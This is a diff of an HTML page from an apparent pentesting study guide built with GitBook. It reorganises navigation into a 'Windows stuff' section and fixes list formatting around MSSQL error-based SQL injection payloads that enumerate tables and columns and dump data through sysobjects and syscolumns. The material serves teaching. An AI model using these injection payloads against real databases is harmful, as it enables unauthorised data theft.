@@ -57,7 +57,7 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="../pentest-stuff/samba.html" />
+    <link rel="next" href="../windows-stuff/basic-windows-enumeration.html" />
     
     
     <link rel="prev" href="http-basics.html" />
@@ -138,16 +138,42 @@
 
     
         
-        <li class="header">Pentest Stuff</li>
+        <li class="header">Windows stuff</li>
         
         
     
-        <li class="chapter " data-level="3.1" data-path="../pentest-stuff/samba.html">
+        <li class="chapter " data-level="3.1" data-path="../windows-stuff/basic-windows-enumeration.html">
             
-                <a href="../pentest-stuff/samba.html">
+                <a href="../windows-stuff/basic-windows-enumeration.html">
+            
+                    
+                    Basic Windows Enumeration
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="../windows-stuff/samba.html">
+            
+                <a href="../windows-stuff/samba.html">
             
                     
                     SAMBA
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3" data-path="../windows-stuff/ldap-ad.html">
+            
+                <a href="../windows-stuff/ldap-ad.html">
+            
+                    
+                    LDAP / AD
             
                 </a>
             
@@ -445,18 +471,20 @@ Another example:
 <p>To enumerate all tables in a database, we can use the following payload:</p>
 <pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST(name as varchar (4096)) FROM &lt;database name&gt;..sysobjects WHERE xtype=&apos;U&apos; and name NOT IN (&lt;known table list&gt;)); --
 </code></pre>
-<pre><code>- `xtype means=&apos;U&apos;` means we only want user-defined tables
-- `name NOT IN (&apos;&lt;know table list&gt;&apos;)` name is a column of the sysobjects table. Everytime we find a new table we will append it to the NOT IN list. This is needed because the error display only the first table name.
-</code></pre><ul>
+<ul>
+<li><code>xtype means=&apos;U&apos;</code> means we only want user-defined tables</li>
+<li><code>name NOT IN (&apos;&lt;know table list&gt;&apos;)</code> name is a column of the sysobjects table. Everytime we find a new table we will append it to the NOT IN list. This is needed because the error display only the first table name.</li>
 <li>The columns of a given table</li>
 </ul>
 <p>After retrieving the tables, we can retrieve the columns using the following payload:</p>
 <pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST (&lt;db name&gt;..syscolumns.name as varchar (4096)) FROM &lt;db name&gt;..syscolumns,&lt;db name&gt;..sysobjects WHERE &lt;db name&gt;..syscolumns.id=&lt;db name&gt;..sysobjects.id AND &lt;dbname&gt;. .sysobjects.name=&lt;table name&gt; AND &lt;db name&gt;..syscolumns.name NOT IN (&lt;known column list&gt;)); --
 </code></pre>
-<pre><code>- `&lt;db name&gt;` is the name of database we&apos;re working on
-- `&lt;table name&gt;` is the table which we&apos;re trying to find the columns
-- `&lt;known column list&gt;` list of columns we already discovered
-</code></pre><p>Finally, to dump the database, we can use the following query:</p>
+<ul>
+<li><code>&lt;db name&gt;</code> is the name of database we&apos;re working on</li>
+<li><code>&lt;table name&gt;</code> is the table which we&apos;re trying to find the columns</li>
+<li><code>&lt;known column list&gt;</code> list of columns we already discovered</li>
+</ul>
+<p>Finally, to dump the database, we can use the following query:</p>
 <pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST (&lt;column name&gt; as varchar (4096) ) FROM &lt;db name&gt;..&lt;table name&gt; WHERE &lt;column name&gt; NOT IN (&lt;retrieved data list&gt;)); -- -
 </code></pre>
 
@@ -491,7 +519,7 @@ Another example:
                 </a>
                 
                 
-                <a href="../pentest-stuff/samba.html" class="navigation navigation-next " aria-label="Next page: SAMBA">
+                <a href="../windows-stuff/basic-windows-enumeration.html" class="navigation navigation-next " aria-label="Next page: Basic Windows Enumeration">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
